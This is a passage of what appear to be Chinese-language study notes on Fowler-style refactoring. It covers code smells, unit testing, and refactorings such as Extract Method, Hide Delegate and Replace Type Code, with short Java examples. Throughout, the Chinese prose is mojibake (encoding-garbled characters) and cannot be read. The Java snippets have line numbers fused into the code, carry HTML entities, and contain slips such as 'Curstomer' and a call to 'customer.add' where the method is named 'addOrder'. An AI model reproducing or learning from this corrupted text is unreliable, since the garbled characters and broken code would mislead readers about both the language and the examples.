Field æŠŠæ‰€æœ‰éœ€è¦ä¿®æ”¹çš„ä»£ç æ”¾åˆ°åŒä¸€ä¸ªç±»ä¸­ã€‚ 7. ä¾æ‹æƒ…ç»“ Feature Envy ä¸€ä¸ªå‡½æ•°å¯¹æŸä¸ªç±»çš„å…´è¶£é«˜äºå¯¹è‡ªå·±æ‰€å¤„ç±»çš„å…´è¶£ï¼Œé€šå¸¸æ˜¯è¿‡å¤šè®¿é—®å…¶å®ƒç±»çš„æ•°æ®ï¼Œ ä½¿ç”¨ Move Method å°†å®ƒç§»åˆ°è¯¥å»çš„åœ°æ–¹ï¼Œå¦‚æœå¯¹å¤šä¸ªç±»éƒ½æœ‰ Feature Envyï¼Œå…ˆç”¨ Extract Method æå–å‡ºå¤šä¸ªå‡½æ•°ã€‚ 8. æ•°æ®æ³¥å›¢ Data Clumps æœ‰äº›æ•°æ®ç»å¸¸ä¸€èµ·å‡ºç°ï¼Œæ¯”å¦‚ä¸¤ä¸ªç±»å…·æœ‰ç›¸åŒçš„å­—æ®µã€è®¸å¤šå‡½æ•°æœ‰ç›¸åŒçš„å‚æ•°ï¼Œè¿™äº›ç»‘å®šåœ¨ä¸€èµ·å‡ºç°çš„æ•°æ®åº”è¯¥æ‹¥æœ‰å±äºå®ƒä»¬è‡ªå·±çš„å¯¹è±¡ã€‚ ä½¿ç”¨ Extract Class å°†å®ƒä»¬æ”¾åœ¨ä¸€èµ·ã€‚ 9. åŸºæœ¬ç±»å‹åæ‰§ Primitive Obsession ä½¿ç”¨ç±»å¾€å¾€æ¯”ä½¿ç”¨åŸºæœ¬ç±»å‹æ›´å¥½ï¼Œä½¿ç”¨ Replace Data Value with Object å°†æ•°æ®å€¼æ›¿æ¢ä¸ºå¯¹è±¡ã€‚ 10. switch æƒŠæ‚šç°èº« Switch Statements å…·ä½“å‚è§ç¬¬ä¸€ç« çš„æ¡ˆä¾‹ã€‚ 11. å¹³è¡Œç»§æ‰¿ä½“ç³» Parallel Inheritance Hierarchies æ¯å½“ä¸ºæŸä¸ªç±»å¢åŠ ä¸€ä¸ªå­ç±»ï¼Œå¿…é¡»ä¹Ÿä¸ºå¦ä¸€ä¸ªç±»ç›¸åº”å¢åŠ ä¸€ä¸ªå­ç±»ã€‚ è¿™ç§ç»“æœä¼šå¸¦æ¥ä¸€äº›é‡å¤æ€§ï¼Œæ¶ˆé™¤é‡å¤æ€§çš„ä¸€èˆ¬ç­–ç•¥ï¼šè®©ä¸€ä¸ªç»§æ‰¿ä½“ç³»çš„å®ä¾‹å¼•ç”¨å¦ä¸€ä¸ªç»§æ‰¿ä½“ç³»çš„å®ä¾‹ã€‚ 12. å†—ä½™ç±» Lazy Class å¦‚æœä¸€ä¸ªç±»æ²¡æœ‰åšè¶³å¤Ÿå¤šçš„å·¥ä½œï¼Œå°±åº”è¯¥æ¶ˆå¤±ã€‚ 13. å¤¸å¤¸å…¶è°ˆæœªæ¥æ€§ Speculative Generality æœ‰äº›å†…å®¹æ˜¯ç”¨æ¥å¤„ç†æœªæ¥å¯èƒ½å‘ç”Ÿçš„å˜åŒ–ï¼Œä½†æ˜¯å¾€å¾€ä¼šé€ æˆç³»ç»Ÿéš¾ä»¥ç†è§£å’Œç»´æŠ¤ï¼Œå¹¶ä¸”é¢„æµ‹æœªæ¥å¯èƒ½å‘ç”Ÿçš„æ”¹å˜å¾ˆå¯èƒ½å’Œæœ€å¼€å§‹çš„è®¾æƒ³ç›¸åã€‚å› æ­¤ï¼Œå¦‚æœä¸æ˜¯å¿…è¦ï¼Œå°±ä¸è¦è¿™ä¹ˆåšã€‚ 14. ä»¤äººè¿·æƒ‘çš„æš‚æ—¶å­—æ®µ Temporary Field æŸä¸ªå­—æ®µä»…ä¸ºæŸç§ç‰¹å®šæƒ…å†µè€Œè®¾ï¼Œè¿™æ ·çš„ä»£ç ä¸æ˜“ç†è§£ï¼Œå› ä¸ºé€šå¸¸è®¤ä¸ºå¯¹è±¡åœ¨æ‰€æœ‰æ—¶å€™éƒ½éœ€è¦å®ƒçš„æ‰€æœ‰å­—æ®µã€‚ æŠŠè¿™ç§å­—æ®µå’Œç‰¹å®šæƒ…å†µçš„å¤„ç†æ“ä½œä½¿ç”¨ Extract Class æç‚¼åˆ°ä¸€ä¸ªç‹¬ç«‹ç±»ä¸­ã€‚ 15. è¿‡åº¦è€¦åˆçš„æ¶ˆæ¯é“¾ Message Chains ä¸€ä¸ªå¯¹è±¡è¯·æ±‚å¦ä¸€ä¸ªå¯¹è±¡ï¼Œç„¶åå†å‘åè€…è¯·æ±‚å¦ä¸€ä¸ªå¯¹è±¡ï¼Œç„¶åâ€¦ï¼Œè¿™å°±æ˜¯æ¶ˆæ¯é“¾ã€‚é‡‡ç”¨è¿™ç§æ–¹å¼ï¼Œæ„å‘³ç€å®¢æˆ·ä»£ç å°†ä¸å¯¹è±¡é—´çš„å…³ç³»ç´§å¯†è€¦åˆã€‚ æ”¹ç”¨å‡½æ•°é“¾ï¼Œç”¨å‡½æ•°å§”æ‰˜å¦ä¸€ä¸ªå¯¹è±¡æ¥å¤„ç†ã€‚ 16. ä¸­é—´äºº Middle Man ä¸­é—´äººè´Ÿè´£å¤„ç†å§”æ‰˜ç»™å®ƒçš„æ“ä½œï¼Œå¦‚æœä¸€ä¸ªç±»ä¸­æœ‰è¿‡å¤šçš„å‡½æ•°éƒ½å§”æ‰˜ç»™å…¶å®ƒç±»ï¼Œé‚£å°±æ˜¯è¿‡åº¦è¿ç”¨å§”æ‰˜ï¼Œåº”å½“ Remove Middle Manï¼Œç›´æ¥ä¸è´Ÿè´£çš„å¯¹è±¡æ‰“äº¤é“ã€‚ 17. ç‹æ˜µå…³ç³» Inappropriate Intimacy ä¸¤ä¸ªç±»å¤šäºäº²å¯†ï¼ŒèŠ±è´¹å¤ªå¤šæ—¶é—´å»æ¢è®¨å½¼æ­¤çš„ private æˆåˆ†ã€‚ 18. å¼‚æ›²åŒå·¥çš„ç±» Alernative Classes with Different Interfaces ä¸¤ä¸ªå‡½æ•°åšåŒä¸€ä»¶äº‹ï¼Œå´æœ‰ç€ä¸åŒçš„ç­¾åã€‚ ä½¿ç”¨ Rename Method æ ¹æ®å®ƒä»¬çš„ç”¨é€”é‡æ–°å‘½åã€‚ 19. ä¸å®Œç¾çš„ç±»åº“ Incomplete Library Class ç±»åº“çš„è®¾è®¡è€…ä¸å¯èƒ½è®¾è®¡å‡ºå®Œç¾çš„ç±»åº“ï¼Œå½“æˆ‘ä»¬éœ€è¦å¯¹ç±»åº“è¿›è¡Œä¸€äº›ä¿®æ”¹æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹ä¸¤ç§æ–¹æ³•ï¼šå¦‚æœåªæ˜¯ä¿®æ”¹ä¸€ä¸¤ä¸ªå‡½æ•°ï¼Œä½¿ç”¨ Introduce Foreign Methodï¼›å¦‚æœè¦æ·»åŠ ä¸€å¤§å †é¢å¤–è¡Œä¸ºï¼Œä½¿ç”¨ Introduce Local Extensionã€‚ 20. å¹¼ç¨šçš„æ•°æ®ç±» Data Class å®ƒåªæ‹¥æœ‰ä¸€äº›æ•°æ®å­—æ®µï¼Œä»¥åŠç”¨äºè®¿é—®è¿™äº›å­—æ®µçš„å‡½æ•°ï¼Œé™¤æ­¤ä¹‹å¤–ä¸€æ— é•¿ç‰©ã€‚ æ‰¾å‡ºå­—æ®µä½¿ç”¨çš„åœ°æ–¹ï¼Œç„¶åæŠŠç›¸åº”çš„æ“ä½œç§»åˆ° Data Class ä¸­ã€‚ 21. è¢«æ‹’ç»çš„é¦ˆèµ  Refused Bequest å­ç±»ä¸æƒ³ç»§æ‰¿è¶…ç±»çš„æ‰€æœ‰å‡½æ•°å’Œæ•°æ®ã€‚ ä¸ºå­ç±»æ–°å»ºä¸€ä¸ªå…„å¼Ÿç±»ï¼Œä¸éœ€è¦çš„å‡½æ•°æˆ–æ•°æ®ä½¿ç”¨ Push Down Method å’Œ Push Down Field ä¸‹æ¨ç»™é‚£ä¸ªå…„å¼Ÿã€‚ 22. è¿‡å¤šçš„æ³¨é‡Š Comments ä½¿ç”¨ Extract Method æç‚¼å‡ºéœ€è¦æ³¨é‡Šçš„éƒ¨åˆ†ï¼Œç„¶åç”¨å‡½æ•°åæ¥è§£é‡Šå‡½æ•°çš„è¡Œä¸ºã€‚ å››ã€æ„ç­‘æµ‹è¯•ä½“ç³»Java å¯ä»¥ä½¿ç”¨ Junit è¿›è¡Œå•å…ƒæµ‹è¯•ã€‚ æµ‹è¯•åº”è¯¥èƒ½å¤Ÿå®Œå…¨è‡ªåŠ¨åŒ–ï¼Œå¹¶èƒ½æ£€æŸ¥æµ‹è¯•çš„ç»“æœã€‚ å°æ­¥ä¿®æ”¹ï¼Œé¢‘ç¹æµ‹è¯•ã€‚ å•å…ƒæµ‹è¯•çš„å¯¹è±¡æ˜¯ç±»çš„æ–¹æ³•ï¼Œè€ŒåŠŸèƒ½æµ‹æ˜¯ä»¥å®¢æˆ·çš„è§’åº¦ä¿è¯è½¯ä»¶æ­£å¸¸è¿è¡Œã€‚ åº”å½“é›†ä¸­æµ‹è¯•å¯èƒ½å‡ºé”™çš„è¾¹ç•Œæ¡ä»¶ã€‚ äº”ã€é‡æ–°ç»„ç»‡å‡½æ•°1. æç‚¼å‡½æ•° Extract Method å°†è¿™æ®µä»£ç æ”¾è¿›ä¸€ä¸ªç‹¬ç«‹å‡½æ•°ä¸­ï¼Œå¹¶è®©å‡½æ•°åç§°è§£é‡Šè¯¥å‡½æ•°çš„ç”¨é€”ã€‚ 2. å†…è”å‡½æ•° Inline Method ä¸€ä¸ªå‡½æ•°çš„æœ¬ä½“ä¸åç§°åŒæ ·æ¸…æ¥šæ˜“æ‡‚ã€‚ åœ¨å‡½æ•°è°ƒç”¨ç‚¹æ’å…¥å‡½æ•°æœ¬ä½“ï¼Œç„¶åç§»é™¤è¯¥å‡½æ•°ã€‚ 3. å†…è”ä¸´æ—¶å˜é‡ Inline Temp ä¸€ä¸ªä¸´æ—¶å˜é‡ï¼Œåªè¢«ç®€å•è¡¨è¾¾å¼èµ‹å€¼ä¸€æ¬¡ï¼Œè€Œå®ƒå¦¨ç¢äº†å…¶å®ƒé‡æ„æ‰‹æ³•ã€‚ å°†æ‰€æœ‰å¯¹è¯¥å˜é‡çš„å¼•ç”¨æ›¿æ¢ä¸ºå¯¹å®ƒèµ‹å€¼çš„é‚£ä¸ªè¡¨è¾¾å¼è‡ªèº«ã€‚ 12double basePrice = anOrder.basePrice();return basePrice &gt; 1000; 1return anOrder.basePrice() &gt; 1000; 4. ä»¥æŸ¥è¯¢å–ä»£ä¸´æ—¶å˜é‡ Replace Temp with Query ä»¥ä¸´æ—¶å˜é‡ä¿å­˜æŸä¸€è¡¨è¾¾å¼çš„è¿ç®—ç»“æœï¼Œå°†è¿™ä¸ªè¡¨è¾¾å¼æç‚¼åˆ°ä¸€ä¸ªç‹¬ç«‹å‡½æ•°ä¸­ï¼Œå°†æ‰€æœ‰å¯¹ä¸´æ—¶å˜é‡çš„å¼•ç”¨ç‚¹æ›¿æ¢ä¸ºå¯¹æ–°å‡½æ•°çš„è°ƒç”¨ã€‚ Replace Temp with Query å¾€å¾€æ˜¯ Extract Method ä¹‹å‰å¿…ä¸å¯å°‘çš„ä¸€ä¸ªæ­¥éª¤ï¼Œå› ä¸ºå±€éƒ¨å˜é‡ä¼šä½¿ä»£ç éš¾ä»¥æç‚¼ã€‚ 12345double basePrice = quantity * itemPrice;if (basePrice &gt; 1000) return basePrice * 0.95;else return basePrice * 0.98; 123456789if (basePrice() &gt; 1000) return basePrice() * 0.95;else return basePrice() * 0.98;// ...double basePrice()&#123; return quantity * itemPrice;&#125; 5. å¼•èµ·è§£é‡Šå˜é‡ Introduce Explaining Variable å°†å¤æ‚è¡¨è¾¾å¼ï¼ˆæˆ–å…¶ä¸­ä¸€éƒ¨åˆ†ï¼‰çš„ç»“æœæ”¾è¿›ä¸€ä¸ªä¸´æ—¶å˜é‡ï¼Œ ä»¥æ­¤å˜é‡åç§°æ¥è§£é‡Šè¡¨è¾¾å¼ç”¨é€”ã€‚ 12345if ((platform.toUpperCase().indexOf("MAC") &gt; -1) &amp;&amp; (browser.toUpperCase().indexOf("IE") &gt; -1) &amp;&amp; wasInitialized() &amp;&amp; resize &gt; 0) &#123; // do something&#125; 1234567final boolean isMacOS = platform.toUpperCase().indexOf("MAC") &gt; -1;final boolean isIEBrower = browser.toUpperCase().indexOf("IE") &gt; -1;final boolean wasResized = resize &gt; 0;if (isMacOS &amp;&amp; isIEBrower &amp;&amp; wasInitialized() &amp;&amp; wasResized) &#123; // do something&#125; 6. åˆ†è§£ä¸´æ—¶å˜é‡ Split Temporary Variable æŸä¸ªä¸´æ—¶å˜é‡è¢«èµ‹å€¼è¶…è¿‡ä¸€æ¬¡ï¼Œå®ƒæ—¢ä¸æ˜¯å¾ªç¯å˜é‡ï¼Œä¹Ÿä¸æ˜¯ç”¨äºæ”¶é›†è®¡ç®—ç»“æœã€‚ é’ˆå¯¹æ¯æ¬¡èµ‹å€¼ï¼Œåˆ›é€ ä¸€ä¸ªç‹¬ç«‹ã€å¯¹åº”çš„ä¸´æ—¶å˜é‡ï¼Œæ¯ä¸ªä¸´æ—¶å˜é‡åªæ‰¿æ‹…ä¸€ä¸ªè´£ä»»ã€‚ 7. ç§»é™¤å¯¹å‚æ•°çš„èµ‹å€¼ Remove Assigments to Parameters ä»¥ä¸€ä¸ªä¸´æ—¶å˜é‡å–ä»£å¯¹è¯¥å‚æ•°çš„èµ‹å€¼ã€‚ 1234int discount (int inputVal, int quentity, int yearToDate) &#123; if (inputVal &gt; 50) inputVal -= 2; ...&#125; 12345int discount (int inputVal, int quentity, int yearToDate) &#123; int result = inputVal; if (inputVal &gt; 50) result -= 2; ...&#125; 8. ä»¥å‡½æ•°å¯¹è±¡å–ä»£å‡½æ•° Replace Method with Method Object å½“å¯¹ä¸€ä¸ªå¤§å‹å‡½æ•°é‡‡ç”¨ Extract Method æ—¶ï¼Œç”±äºåŒ…å«äº†å±€éƒ¨å˜é‡ä½¿å¾—å¾ˆéš¾è¿›è¡Œè¯¥æ“ä½œã€‚ å°†è¿™ä¸ªå‡½æ•°æ”¾è¿›ä¸€ä¸ªå•ç‹¬å¯¹è±¡ä¸­ï¼Œå¦‚æ­¤ä¸€æ¥å±€éƒ¨å˜é‡å°±æˆäº†å¯¹è±¡å†…çš„å­—æ®µã€‚ç„¶åå¯ä»¥åœ¨åŒä¸€ä¸ªå¯¹è±¡ä¸­å°†è¿™ä¸ªå¤§å‹å‡½æ•°åˆ†è§£ä¸ºå¤šä¸ªå°å‹å‡½æ•°ã€‚ 9. æ›¿æ¢ç®—æ³• Subsititute Algorithn å…­ã€åœ¨å¯¹è±¡ä¹‹é—´æ¬ç§»ç‰¹æ€§1. æ¬ç§»å‡½æ•° Move Method ç±»ä¸­çš„æŸä¸ªå‡½æ•°ä¸å¦ä¸€ä¸ªç±»è¿›è¡Œæ›´å¤šäº¤æµï¼šè°ƒç”¨åè€…æˆ–è€…è¢«åè€…è°ƒç”¨ã€‚ å°†è¿™ä¸ªå‡½æ•°æ¬ç§»åˆ°å¦ä¸€ä¸ªç±»ä¸­ã€‚ 2. æ¬ç§»å­—æ®µ Move Field ç±»ä¸­çš„æŸä¸ªå­—æ®µè¢«å¦ä¸€ä¸ªç±»æ›´å¤šåœ°ç”¨åˆ°ï¼Œè¿™é‡Œçš„ç”¨åˆ°æ˜¯æŒ‡è°ƒç”¨å–å€¼è®¾å€¼å‡½æ•°ï¼Œåº”å½“æŠŠè¯¥å­—æ®µç§»åˆ°å¦ä¸€ä¸ªç±»ä¸­ã€‚ 3. æç‚¼ç±» Extract Class æŸä¸ªç±»åšäº†åº”å½“ç”±ä¸¤ä¸ªç±»åšçš„äº‹ã€‚ åº”å½“å»ºç«‹ä¸€ä¸ªæ–°ç±»ï¼Œå°†ç›¸å…³çš„å­—æ®µå’Œå‡½æ•°ä»æ—§ç±»æ¬ç§»åˆ°æ–°ç±»ã€‚ 4. å°†ç±»å†…è”åŒ– Inline Class ä¸ Extract Class ç›¸åã€‚ 5. éšè—å§”æ‰˜å…³ç³» Hide Delegate å»ºç«‹æ‰€éœ€çš„å‡½æ•°ï¼Œéšè—å§”æ‰˜å…³ç³»ã€‚ 123456789101112131415class Person &#123; Department department; public Department getDepartment() &#123; return department; &#125;&#125;class Department &#123; private Person manager; public Person getManager() &#123; return manager; &#125;&#125; å¦‚æœå®¢æˆ·å¸Œæœ›çŸ¥é“æŸäººçš„ç»ç†æ˜¯è°ï¼Œå¿…é¡»è·å¾— Department å¯¹è±¡ï¼Œè¿™æ ·å°±å¯¹å®¢æˆ·æ­éœ²äº† Department çš„å·¥ä½œåŸç†ã€‚ 1Person manager = john.getDepartment().getManager(); é€šè¿‡ä¸º Peron å»ºç«‹ä¸€ä¸ªå‡½æ•°æ¥éšè—è¿™ç§å§”æ‰˜å…³ç³»ã€‚ 123public Person getManager() &#123; return department.getManager();&#125; 6. ç§»é™¤ä¸­é—´äºº Remove Middle Man ä¸ Hide Delegate ç›¸åï¼Œæœ¬æ–¹æ³•éœ€è¦ç§»é™¤å§”æ‰˜å‡½æ•°ï¼Œè®©å®¢æˆ·ç›´æ¥è°ƒç”¨å§”æ‰˜ç±»ã€‚ Hide Delegate æœ‰å¾ˆå¤§å¥½å¤„ï¼Œä½†æ˜¯å®ƒçš„ä»£ä»·æ˜¯ï¼šæ¯å½“å®¢æˆ·è¦ä½¿ç”¨å—æ‰˜ç±»çš„æ–°ç‰¹æ€§æ—¶ï¼Œå°±å¿…é¡»åœ¨æœåŠ¡å™¨ç«¯æ·»åŠ ä¸€ä¸ªç®€å•çš„å§”æ‰˜å‡½æ•°ã€‚éšç€å—å§”æ‰˜çš„ç‰¹æ€§è¶Šæ¥è¶Šå¤šï¼ŒæœåŠ¡å™¨ç±»å®Œå…¨å˜æˆäº†ä¸€ä¸ªâ€œä¸­é—´äººâ€ã€‚ 7. å¼•å…¥å¤–åŠ å‡½æ•° Introduce Foreign Method éœ€è¦ä¸ºæä¾›æœåŠ¡çš„ç±»æ·»åŠ ä¸€ä¸ªå‡½æ•°ï¼Œä½†æ˜¯æ— æ³•ä¿®æ”¹è¿™ä¸ªç±»ã€‚ å¯ä»¥åœ¨å®¢æˆ·ç±»ä¸­å»ºç«‹ä¸€ä¸ªå‡½æ•°ï¼Œå¹¶ä»¥ç¬¬ä¸€å‚æ•°å½¢å¼ä¼ å…¥ä¸€ä¸ªæœåŠ¡ç±»çš„å®ä¾‹ï¼Œè®©å®¢æˆ·ç±»ç»„åˆæœåŠ¡å™¨å®ä¾‹ã€‚ 8. å¼•å…¥æœ¬åœ°æ‰©å±• Introduce Local Extension å’Œ Introduce Foreign Method ç›®çš„ä¸€æ ·ï¼Œä½†æ˜¯ Introduce Local Extension é€šè¿‡å»ºç«‹æ–°çš„ç±»æ¥å®ç°ã€‚æœ‰ä¸¤ç§æ–¹å¼ï¼šå­ç±»æˆ–è€…åŒ…è£…ç±»ï¼Œå­ç±»å°±æ˜¯é€šè¿‡ç»§æ‰¿å®ç°ï¼ŒåŒ…è£…ç±»å°±æ˜¯é€šè¿‡ç»„åˆå®ç°ã€‚ ä¸ƒã€é‡æ–°ç»„ç»‡æ•°æ®1. è‡ªå°è£…å­—æ®µ Self Encapsulate Field ä¸ºå­—æ®µå»ºç«‹å–å€¼/è®¾å€¼å‡½æ•°ï¼Œå¹¶ç”¨è¿™äº›å‡½æ•°æ¥è®¿é—®å­—æ®µã€‚åªæœ‰å½“å­ç±»æƒ³è®¿é—®è¶…ç±»çš„ä¸€ä¸ªå­—æ®µï¼Œåˆæƒ³åœ¨å­ç±»ä¸­å°†å¯¹è¿™ä¸ªå­—æ®µè®¿é—®æ”¹ä¸ºä¸€ä¸ªè®¡ç®—åçš„å€¼ï¼Œæ‰ä½¿ç”¨è¿™ç§æ–¹å¼ï¼Œå¦åˆ™ç›´æ¥è®¿é—®å­—æ®µçš„æ–¹å¼ç®€æ´æ˜äº†ã€‚ 2. ä»¥å¯¹è±¡å–ä»£æ•°æ®å€¼ Replace Data Value with Object åœ¨å¼€å‘åˆæœŸï¼Œå¾€å¾€ä¼šç”¨ç®€å•çš„æ•°æ®é¡¹è¡¨ç¤ºç®€å•çš„æƒ…å†µï¼Œä½†æ˜¯éšç€å¼€å‘çš„è¿›è¡Œï¼Œä¸€äº›ç®€å•æ•°æ®é¡¹ä¼šå…·æœ‰ä¸€äº›ç‰¹æ®Šè¡Œä¸ºã€‚æ¯”å¦‚ä¸€å¼€å§‹ä¼šæŠŠç”µè¯å·ç å­˜æˆå­—ç¬¦ä¸²ï¼Œä½†æ˜¯éšåå‘ç°ç”µè¯å·ç éœ€è¦â€œæ ¼å¼åŒ–â€ã€â€œæŠ½å–åŒºå·â€ä¹‹ç±»çš„ç‰¹æ®Šè¡Œä¸ºã€‚ 3. å°†å€¼å¯¹è±¡æ”¹æˆå¼•ç”¨å¯¹è±¡ Change Value to Reference å°†å½¼æ­¤ç›¸ç­‰çš„å®ä¾‹æ›¿æ¢ä¸ºåŒä¸€ä¸ªå¯¹è±¡ã€‚è¿™å°±è¦ç”¨ä¸€ä¸ªå·¥å‚æ¥åˆ›å»ºè¿™ç§å”¯ä¸€å¯¹è±¡ï¼Œå·¥å‚ç±»ä¸­éœ€è¦ä¿ç•™ä¸€ä»½å·²ç»åˆ›å»ºå¯¹è±¡çš„åˆ—è¡¨ï¼Œå½“è¦åˆ›å»ºä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œå…ˆæŸ¥æ‰¾è¿™ä»½åˆ—è¡¨ä¸­æ˜¯å¦å·²ç»å­˜åœ¨è¯¥å¯¹è±¡ï¼Œå¦‚æœå­˜åœ¨ï¼Œåˆ™è¿”å›åˆ—è¡¨ä¸­çš„è¿™ä¸ªå¯¹è±¡ï¼›å¦åˆ™ï¼Œæ–°å»ºä¸€ä¸ªå¯¹è±¡ï¼Œæ·»åŠ åˆ°åˆ—è¡¨ä¸­ï¼Œå¹¶è¿”å›è¯¥å¯¹è±¡ã€‚ 4. å°†å¼•ç”¨å¯¹è±¡æ”¹ä¸ºå€¼å¯¹è±¡ Change Reference to value ä»¥ Change Value to Reference ç›¸åã€‚å€¼å¯¹è±¡æœ‰ä¸ªéå¸¸é‡è¦çš„ç‰¹æ€§ï¼šå®ƒæ˜¯ä¸å¯å˜çš„ï¼Œä¸å¯å˜è¡¨ç¤ºå¦‚æœè¦æ”¹å˜è¿™ä¸ªå¯¹è±¡ï¼Œå¿…é¡»ç”¨ä¸€ä¸ªæ–°çš„å¯¹è±¡æ¥æ›¿æ¢æ—§å¯¹è±¡ï¼Œè€Œä¸æ˜¯ä¿®æ”¹æ—§å¯¹è±¡ã€‚ éœ€è¦ä¸ºå€¼å¯¹è±¡å®ç° equals() å’Œ hashCode() æ–¹æ³•ã€‚ 5. ä»¥å¯¹è±¡å–ä»£æ•°ç»„ Replace Array with Object æœ‰ä¸€ä¸ªæ•°ç»„ï¼Œå…¶ä¸­çš„å…ƒç´ å„è‡ªä»£è¡¨ä¸åŒçš„ä¸œè¥¿ã€‚ ä»¥å¯¹è±¡æ›¿æ¢æ•°ç»„ï¼Œå¯¹äºæ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œä»¥ä¸€ä¸ªå­—æ®µæ¥è¡¨ç¤ºï¼Œè¿™æ ·æ–¹ä¾¿æ“ä½œï¼Œä¹Ÿæ›´å®¹æ˜“ç†è§£ã€‚ 6. èµ‹å€¼è¢«ç›‘è§†æ•°æ® Duplicate Observed Data ä¸€äº›é¢†åŸŸæ•°æ®ç½®èº«äº GUI æ§ä»¶ä¸­ï¼Œè€Œé¢†åŸŸå‡½æ•°éœ€è¦è®¿é—®è¿™äº›æ•°æ®ã€‚ å°†è¯¥æ•°æ®èµ‹å€¼åˆ°ä¸€ä¸ªé¢†åŸŸå¯¹è±¡ä¸­ï¼Œå»ºç«‹ä¸€ä¸ª Oberver æ¨¡å¼ï¼Œç”¨äºåŒæ­¥é¢†åŸŸå¯¹è±¡å’Œ GUI å¯¹è±¡å†…çš„é‡å¤æ•°æ®ã€‚ 7. å°†å•å‘å…³è”æ”¹ä¸ºåŒå‘å…³è” Change Unidirectional Association to Bidirectional å½“ä¸¤ä¸ªç±»éƒ½éœ€è¦å¯¹æ–¹çš„ç‰¹æ€§æ—¶ï¼Œå¯ä»¥ä½¿ç”¨åŒå‘å…³è”ã€‚ æœ‰ä¸¤ä¸ªç±»ï¼Œåˆ†åˆ«ä¸ºè®¢å• Order å’Œå®¢æˆ· Customerï¼ŒOrder å¼•ç”¨äº† Customerï¼ŒCustomer ä¹Ÿéœ€è¦å¼•ç”¨ Order æ¥æŸ¥çœ‹å…¶æ‰€æœ‰è®¢å•è¯¦æƒ…ã€‚ 123456789class Order &#123; private Customer customer; public void setCustomer(Customer customer) &#123; if (this.customer != null) this.customer.removeOrder(this); this.customer = customer; this.customer.add(this); &#125;&#125; 123456789class Curstomer &#123; private Set&lt;Order&gt; orders = new HashSet&lt;&gt;(); public void removeOrder(Order order) &#123; orders.remove(order); &#125; public void addOrder(Order order) &#123; orders.add(order); &#125;&#125; æ³¨æ„åˆ°ï¼Œè¿™é‡Œè®© Curstomer ç±»æ¥æ§åˆ¶å…³è”å…³ç³»ã€‚æœ‰ä»¥ä¸‹åŸåˆ™æ¥å†³å®šå“ªä¸ªç±»æ¥æ§åˆ¶å…³è”å…³ç³»ï¼šå¦‚æœæŸä¸ªå¯¹è±¡æ˜¯ç»„æˆå¦ä¸€ä¸ªå¯¹è±¡çš„éƒ¨ä»¶ï¼Œé‚£ä¹ˆç”±åè€…è´Ÿè´£æ§åˆ¶å…³è”å…³ç³»ï¼›å¦‚æœæ˜¯ä¸€å¯¹å¤šå…³ç³»ï¼Œåˆ™ç”±å•ä¸€å¼•ç”¨é‚£ä¸€æ–¹æ¥æ§åˆ¶å…³è”å…³ç³»ã€‚ 8. å°†åŒå‘å…³è”æ”¹ä¸ºå•å‘å…³è” Change Bidirectional Association to Unidirectional å’Œ Change Unidirectional Association to Bidirectiona ä¸ºåæ“ä½œã€‚ åŒå‘å…³è”ç»´æŠ¤æˆæœ¬é«˜ï¼Œå¹¶ä¸”ä¹Ÿä¸æ˜“äºç†è§£ã€‚å¤§é‡çš„åŒå‘è¿æ¥å¾ˆå®¹æ˜“é€ æˆâ€œåƒµå°¸å¯¹è±¡â€ï¼šæŸä¸ªå¯¹è±¡æœ¬èº«å·²ç»æ­»äº¡äº†ï¼Œå´ä¿ç•™åœ¨ç³»ç»Ÿä¸­ï¼Œå› ä¸ºå®ƒçš„å¼•ç”¨è¿˜æ²¡æœ‰å…¨éƒ¨å®Œå…¨æ¸…é™¤ã€‚ 9. ä»¥å­—é¢å¸¸é‡å–ä»£é­”æ³•æ•° Replace Magic Number with Symbolic Constant åˆ›å»ºä¸€ä¸ªå¸¸é‡ï¼Œæ ¹æ®å…¶æ„ä¹‰ä¸ºå®ƒå‘½åï¼Œå¹¶å°†å­—é¢å¸¸é‡æ¢ä¸ºè¿™ä¸ªå¸¸é‡ã€‚ 10. å°è£…å­—æ®µ Encapsulate Field public å­—æ®µåº”å½“æ”¹ä¸º privateï¼Œå¹¶æä¾›ç›¸åº”çš„è®¿é—®å‡½æ•°ã€‚ 11. å°è£…é›†åˆ Encapsulate Collection å‡½æ•°è¿”å›é›†åˆçš„ä¸€ä¸ªåªè¯»å‰¯æœ¬ï¼Œå¹¶åœ¨è¿™ä¸ªç±»ä¸­æä¾›æ·»åŠ /ç§»é™¤é›†åˆå…ƒç´ çš„å‡½æ•°ã€‚å¦‚æœå‡½æ•°è¿”å›é›†åˆè‡ªèº«ï¼Œä¼šè®©ç”¨æˆ·å¾—ä»¥ä¿®æ”¹é›†åˆå†…å®¹è€Œé›†åˆæ‹¥æœ‰è€…å´ä¸€æ— æ‰€çŸ¥ã€‚ 12. ä»¥æ•°æ®ç±»å–ä»£è®°å½• Replace Record with Data Class 13. ä»¥ç±»å–ä»£ç±»å‹ç  Replace Type Code with Class ç±»ä¸­æœ‰ä¸€ä¸ªæ•°å€¼ç±»å‹ç ï¼Œä½†å®ƒå¹¶ä¸å½±å“ç±»çš„è¡Œä¸ºï¼Œå°±ç”¨ä¸€ä¸ªæ–°ç±»æ›¿æ¢è¯¥æ•°å€¼ç±»å‹ç ã€‚å¦‚æœç±»å‹ç å‡ºç°åœ¨ switch è¯­å¥ä¸­ï¼Œéœ€è¦ä½¿ç”¨ Replace Conditional with Polymorphism å»æ‰ switchï¼Œé¦–å…ˆå¿…é¡»è¿ç”¨ Replace Type Code with Subcalss æˆ– Replace Type Code with State/Strategy å»æ‰ç±»å‹ç ã€‚ 14. ä»¥å­ç±»å–ä»£ç±»å‹ç  Replace Type Code with Subcalsses æœ‰ä¸€ä¸ªä¸å¯å˜çš„ç±»å‹ç ï¼Œå®ƒä¼šå½±å“ç±»çš„è¡Œä¸ºï¼Œä»¥å­ç±»å–ä»£è¿™ä¸ªç±»å‹ç ã€‚ 15. ä»¥ State/Strategy å–ä»£ç±»å‹ç  Replace Type Code with State/Strategy æœ‰ä¸€ä¸ªå¯å˜çš„ç±»å‹ç ï¼Œå®ƒä¼šå½±å“ç±»çš„è¡Œä¸ºï¼Œä»¥çŠ¶æ€å¯¹è±¡å–ä»£ç±»å‹ç ã€‚ å’Œ Replace Type Code with Subcalsses çš„åŒºåˆ«æ˜¯ Replace Type Code with State/Strategy çš„ç±»å‹ç 